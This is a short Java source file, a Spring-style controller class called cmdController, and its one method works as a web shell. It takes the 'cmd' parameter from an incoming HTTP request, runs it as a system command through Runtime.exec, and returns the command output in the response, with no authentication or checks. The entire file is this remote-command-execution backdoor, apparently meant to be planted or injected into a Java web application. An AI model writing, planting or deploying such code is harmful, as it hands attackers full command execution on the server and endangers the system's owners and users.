package com.controller;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.util.Scanner;

public class cmdController {
    public cmdController(){
    }

    public void cmd() throws Exception {
        HttpServletRequest request = (
                (ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()
        ).getRequest();
        HttpServletResponse response = (
                (ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()
        ).getResponse();
        if(request.getParameter("cmd")!= null){
            System.out.println(request.getParameter("cmd"));
            InputStream inputStream = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
            Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
            String output = scanner.hasNext() ? scanner.next() : "";
            response.getWriter().write(output);
        }
    }
}
